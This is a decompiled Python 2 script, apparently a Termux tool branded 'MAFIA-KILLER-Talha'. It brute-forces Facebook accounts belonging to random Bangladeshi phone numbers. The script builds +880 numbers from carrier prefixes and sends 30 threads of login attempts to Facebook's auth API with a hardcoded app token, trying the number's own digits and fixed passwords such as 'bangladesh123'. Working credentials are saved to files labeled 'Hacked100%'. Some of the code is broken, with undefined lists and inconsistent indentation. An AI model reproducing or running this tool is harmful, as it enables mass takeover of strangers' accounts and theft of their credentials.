# Decompile by KangEhem:)
# with (uncompyle6) version : 3.7.4
# Time Succes decompile : 2022-09-07 08:13:36.727454
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(7000):
    number = random.randint(111111, 999999)
    
    sys.stdout = open('.txt', 'a')
    print(number)
    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 number.py')
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def exb():
	print '[!] Exit'
	os.sys.exit()
def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def t():
    time.sleep(1)
def cb():
    os.system('clear')
B='\033[1;94m'
K='\033[1;90m'
M='\033[1;98m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'
logo = """
\033[1;91m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
\033[1;92m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
\033[1;93m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
\033[1;94m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
*_ꙮ⃢▄▆▇█�⃢✿⁍⃢🇪⃢⁌✿⃢��⃢✿⁍⃢🇪⃢⁌✿⃢��⃢✿⁍⃢🇪⃢⁌✿⃢�⃢✿⁍⃢🇪⃢⁌✿⃢��█▇▆▄⃢ꙮ_*
\033[1;91m        █▀▄▀█ █▀▀█ █▀▀ ░▀░ █▀▀█
\033[1;93m        █░▀░█ █▄▄█ █▀▀ ▀█▀ █▄▄█
\033[1;92m        ▀░░░▀ ▀░░▀ ▀░░ ▀▀▀ ▀░░▀
\033[1;97m        █░█ ░▀░ █░░ █░░ █▀▀ █▀▀█
\033[1;96m        █▀▄ ▀█▀ █░░ █░░ █▀▀ █▄▄▀
\033[1;95m        ▀░▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀░▀▀
\033[1;95m ____   __    __    _   _    __   
\033[1;95m(_  _) /__\  (  )  ( )_( )  /__\  
 \033[1;95m )(  /(__)\  )(__  ) _ (  /(__)\ 
 \033[1;95m(__)(__)(__)(____)(_) (_)(__)(__)
*_ꙮ⃢▄▆▇█�⃢✿⁍⃢🇪⃢⁌✿⃢��⃢✿⁍⃢🇪⃢⁌✿⃢��⃢✿⁍⃢🇪⃢⁌✿⃢�⃢✿⁍⃢🇪⃢⁌✿⃢��█▇▆▄⃢ꙮ_*
\033[1;91m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
\033[1;92m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
\033[1;93m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
\033[1;94m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   MAFIA-KILLER-Talha☕
           💕💕         BE HAPPY 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕         
"""
logo2 = """
\x1b[1;92m➣ NAME :           💗 TALHA ISLAM 💗
\x1b[1;91m➣ PGE NAME :  💣TERMUX TEACHER TALHA💣
\x1b[1;93m➣ WHATSAPP NO :   👬 +8801304002896 👬
\x1b[1;95m➣ WARNING :  👉 DON,T CALL ME ONLY TEXT🔫
\x1b[1;96m➣ CLONING COUNTRY NAME :  BANGLADESH
\x1b[1;97m➣ NOTE :      💕USE 4GB YA 6GB RAM MOBILE💕
\x1b[1;92m➣ NOTE :      👏USE FAST 4G SIM NET👏
\x1b[1;91m➣ NOTE :      🌍 1ST CLEAR TERMUX MEMORY DATA🌍
\x1b[1;95m➣ NOTE :  🔎NO NEED VPN🔎 ( 🌷WITHOUT LOGIN🌷 )
\x1b[1;93m➣ DISCLAMIAR :  👊AWAY FROM ILLIGAL WAY👊
\x1b[1;93m
"""
back = 0
successful = []
checkpoint = []
successfull = []
id = []
os.system("clear")
print  """
      💙💙                    💙💙 
    💙🍁🍁💙   💙🍁🍁💙
  💙 🍁🍁🍁💙🍁🍁🍁 💙
   💙🍁🍁🍁🍁🍁🍁🍁💙
     💙🍁🍁🍁🍁🍁🍁💙
          💙🍁🍁🍁🍁💙
               💙🍁🍁💙          
        ❤❤  💙 💙 ❤❤
   ❤🍃🍃❤ 💙❤🍃🍃❤
  ❤ 🍃🍃🍃❤🍃🍃🍃 ❤
   ❤🍃🍃🍃🍃🍃🍃🍃❤
     ❤🍃🍃🍃🍃🍃🍃❤
          ❤🍃🍃🍃🍃❤
               ❤🍃🍃❤
                   ❤ ❤ 
                      ❤ 
 """
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		
def menu():
	os.system('clear')
	print logo
	print "\033[1;96m💖━━━━━━━━━💘💘💘(MAFIA-KILLER-TALHA)💘💘💘━━━━━━━━💖\n" 
	print '\033[1;97m[1]\033[1;92m GP'
	print '\033[1;97m[2]\033[1;92m Robi'
	print '\033[1;97m[3]\033[1;92m Airtel'
	print '\033[1;97m[4]\033[1;92m Banglalink'
	print '\033[1;97m[5]\033[1;92m Teletalk'
	print '\033[1;97m[6]\033[1;92m Youtube'
	print '\033[1;97m[0]\033[1;92m Exit            '
	print "\033[1;96m💖━━━━━━━━━💘💘💘(MAFIA-KILLER-TALHA)💘💘💘━━━━━━━━💖\n" 
	action()
	
def action():
	ahmad = raw_input('\n\033[1;91m>>>  ')
	if ahmad =='':
		print '[!] Fill in correctly'
		action()
	elif ahmad =="1":
		os.system("clear")
		print (logo2)
		print("\033[1;93m170,171, 172, 173, 174, 175, 176, 177, 178, 179,130,131, 132, 133, 134, 135, 136, 137, 138, 139")
		try:
			c = raw_input("\033[1;96m choose code  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif ahmad =="2":
		os.system("clear")
		print (logo2)
		print("\033[1;93m180,181, 182, 183, 184, 185, 186, 187, 188, 189")
		try:
			c = raw_input("\033[1;96m choose code  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif ahmad =="3":
		os.system("clear")
		print (logo2)
		print("\033[1;93m160,161, 162, 163, 164, 165, 166, 167, 168, 169")
		try:
			c = raw_input("\033[1;96m choose code  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif ahmad =="4":
		os.system("clear")
		print (logo2)
		print("\033[1;93m190,191, 192, 193, 194, 195, 196, 197, 198, 199,140,141, 142, 143, 144, 145, 146, 147, 148, 149")
		try:
			c = raw_input("\033[1;96m choose code  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif ahmad =="5":
		os.system("clear")
		print (logo2)
		print("\033[1;93m150,151, 152, 153, 154, 155, 156, 157, 158, 159")
		try:
			c = raw_input("\033[1;96m choose code  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif ahmad =="6":		
		os.system('xdg-open https://youtube.com/c/TalhaTechnologychannel')
		login()
	elif ahmad =='0':
		exb()
	else:
		print '[!] Fill in correctly'
		action()
	xxx = str(len(id))
	psb ('[✓] Total Numbers: '+xxx)
	time.sleep(0.5)
	psb ('\033[1;91m[✓]\033[1;94m Please wait, process is running ...')
	time.sleep(0.5)
	psb ('[!] To Stop Process Press CTRL+z')
	time.sleep(0.5)
	print "\033[1;96m💖━━━━━━━━━━💘💘💘(MAFIA-KILLER-Talha)💘💘💘━━━━━━━━━💖\n" 
	
	
			
	def main(arg):
		global checkpoint,successfull
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m{Hacked100%💉}  ' + k + c + user + '  》  ' + pass1+'\n'+"\n"
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'-•◈•-'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;96m[Talha-Checkpoint] ' + k + c + user + '  》  ' + pass1+'\n'
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'-•◈•-'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
 				else:
 				    pass2="786786"
 				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 				    q = json.load(data)
 				    if 'access_token' in q:
 				        print '\x1b[1;92m{Hacked100%💉}  ' + k + c + user + '  》  ' + pass2+'\n'+"\n"
 				        okb = open('save/successfull.txt', 'a')
 				        okb.write(k+c+user+'-•◈•-'+pass2+'\n')
 				        okb.close()
 				        oks.append(c+user+pass2)
 				    else:
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[1;96m[Checkpoint] ' + k + c + user + '  》  ' + pass2+'\n'
 					        cps = open('save/checkpoint.txt', 'a')
 					        cps.write(k+c+user+'-•◈•-'+pass2+'\n')
 					        cps.close()
 					        cpb.append(c+user+pass2)
                                        else:
 				            pass3="bangladesh123"
 				            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 				            q = json.load(data)
 				            if 'access_token' in q:
 				                print '\x1b[1;92m{Hacked100%💉}  ' + k + c + user + '  》  ' + pass3+'\n'+"\n"
 				                okb = open('save/successfull.txt', 'a')
 				                okb.write(k+c+user+'-•◈•-'+pass3+'\n')
 				                okb.close()
 				                oks.append(c+user+pass3)
 				            else:
 				                if 'www.facebook.com' in q['error_msg']:
 					                print '\033[1;96m[Checkpoint] ' + k + c + user + '  》  ' + pass3+'\n'
 					                cps = open('save/checkpoint.txt', 'a')
 					                cps.write(k+c+user+'-•◈•-'+pass3+'\n')
 					                cps.close()
 					                cpb.append(c+user+pass3)
                                                else:
 				                    pass4="banglades"
 				                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 				                    q = json.load(data)
 				                    if 'access_token' in q:
 				                        print '\x1b[1;92m{Hacked100%💉}  ' + k + c + user + '  》  ' + pass4+'\n'+"\n"
 				                        okb = open('save/successfull.txt', 'a')
 				                        okb.write(k+c+user+'-•◈•-'+pass4+'\n')
 				                        okb.close()
 				                        oks.append(c+user+pass4)
 				                    else:
 				                        if 'www.facebook.com' in q['error_msg']:
 					                        print '\033[1;96m[Checkpoint] ' + k + c + user + '  》  ' + pass4+'\n'
 					                        cps = open('save/checkpoint.txt', 'a')
 					                        cps.write(k+c+user+'-•◈•-'+pass4+'\n')
 					                        cps.close()
 					                        cpb.append(c+user+pass4)
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;96m💖━━━━━━━━━━━━💘💘💘(MAFIA-KILLER-Talha)💘💘💘━━━━━━━━━━━💖" 
	print '[✓] Process Has Been Completed ....'
	print '[✓] Total OK/CP : '+str(len(successfull))+'/'+str(len(checkpoint))
	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
	print"""
(¯`🌹¯)🌷
`*.🍃.*´. 🌸🍃🌸:*¸. • 
¸.•´¸.•*¨) ¸🌹•*¨) 🌸 
🌸(¸.•´🍃(¸.•´ .•´ 🍃¸.🌸
🔮🌷*.*.¸¸¸¸.*.*.¸¸🌷🔮 　　┊　┊　┊
🔮🌷LOVE YOU🌷🔮 
　　┊　┊　┊
　　┊　┊    🔮   　　　
　　┊   🔮
　   🔮
(¯`🌹¯)🌷
`*.🍃.*´. 🌸🍃🌸:*¸. • 
¸.•´¸.•*¨) ¸🌹•*¨) 🌸 
🌸(¸.•´🍃(¸.•´ .•´ .🌸
	"""
	raw_input('\n[Press Enter To Go Back]')
	os.system('python2 hack.py')
		
if __name__ == '__main__':
	menu()
# Mau Ngapain Cuk?
